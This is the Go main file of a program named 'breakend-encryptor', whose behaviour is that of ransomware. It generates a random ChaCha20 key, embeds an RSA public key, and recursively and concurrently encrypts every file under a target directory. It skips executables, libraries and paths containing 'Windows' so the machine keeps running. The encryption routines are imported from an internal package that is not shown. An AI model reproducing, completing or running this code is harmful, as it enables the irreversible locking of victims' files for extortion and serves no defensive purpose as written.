package main

import (
	encryptor "breakend-encryptor/internal/chacha20"
	"crypto/rand"
	"embed" // embed package is used to embed files into the binary
	"fmt"
	"io"
	"os"
	"runtime"
	"strings"
	"sync"

	"github.com/charmbracelet/log"
)

var sem chan struct{}

var noEncryptExtensions = []string{
	".encrypted",
	".exe",
	".dll",
	".so",
	".dylib",
}

//go:embed public.pem
var pubKey embed.FS

func readPEMfile() ([]byte, error) {
	file, err := pubKey.ReadFile("public.pem")
	if err != nil {
		return nil, err
	}
	return file, nil
}

func init() {
	sem = make(chan struct{}, runtime.NumCPU()*2)
}

func encryptFile(path string, key []byte, pubRsaKeyBytes []byte, wg *sync.WaitGroup) {
	defer wg.Done()
	sem <- struct{}{}
	defer func() { <-sem }()
	file, err := os.Stat(path)
	if err != nil {
		log.Fatal("Error reading file: ", err)
		return
	}
	// Check if file external extension is in noEncryptExtensions
	for _, ext := range noEncryptExtensions {
		if ext == file.Name()[len(file.Name())-len(ext):] {
			log.Warn("File extension not supported: ", file.Name())
			return
		}
	}

	fileSize := file.Size()

	switch {
	case fileSize < 1400000:
		log.Warn("Encrypting file with T1...")
		err = encryptor.EncryptFileT1(path, key, pubRsaKeyBytes)
	case fileSize >= 1400000 && fileSize <= 5300000:
		log.Warn("Encrypting file with T2...")
		err = encryptor.EncryptFileT2(path, key, pubRsaKeyBytes)
	case fileSize > 5300000:
		log.Warn("Encrypting file with T3...")
		err = encryptor.EncryptLargeFile(path, 50, key, pubRsaKeyBytes)
	}

	if err != nil {
		log.Error("Error encrypting file ", err)
	} else {
		log.Info("File encrypted")
		log.Debug("File: ", path)
	}
}

func encryptDirectory(path string, key []byte, pubRsaKeyBytes []byte) error {
	fileInfo, err := os.Stat(path)
	if err != nil {
		return err
	}

	// If the path is a file, encrypt the file directly
	if !fileInfo.IsDir() {
		var wg sync.WaitGroup
		wg.Add(1)
		go encryptFile(path, key, pubRsaKeyBytes, &wg)
		wg.Wait()
		return nil
	}

	dir, err := os.Open(path)
	if err != nil {
		return err
	}
	defer dir.Close()

	files, err := dir.Readdir(-1)
	if err != nil {
		log.Error("Error reading directory: ", err)
		return err
	}

	var wg sync.WaitGroup
	var dirs []os.FileInfo

	for _, file := range files {
		if file.IsDir() {
			dirs = append(dirs, file)
		} else {
			wg.Add(1)
			go encryptFile(path+"/"+file.Name(), key, pubRsaKeyBytes, &wg)
		}
	}

	wg.Wait()

	for _, dir := range dirs {
		err = encryptDirectory(path+"/"+dir.Name(), key, pubRsaKeyBytes)
		if err != nil {
			return err
		}
	}

	return nil
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: breakend-encryptor.exe <directory|filePath>")
		os.Exit(1)
	}

	var chacha20key [32]byte
	if _, err := io.ReadFull(rand.Reader, chacha20key[:]); err != nil {
		log.Fatal("Error generating key: ", err)
	}

	var path string = os.Args[1]
	// Check if path contains Windows word skip to avoid encrypting Windows system files
	if !strings.Contains(path, "Windows") {
		pubRsaKeyBytes, err := readPEMfile()
		if err != nil {
			log.Fatal("Error reading public key: ", err)
		}

		err = encryptDirectory(path, chacha20key[:], pubRsaKeyBytes)
		if err != nil {
			log.Fatal("Error encrypting directory: ", err)
		}
	} else {
		log.Fatal("Windows system files detected. Aborting...")
	}
}
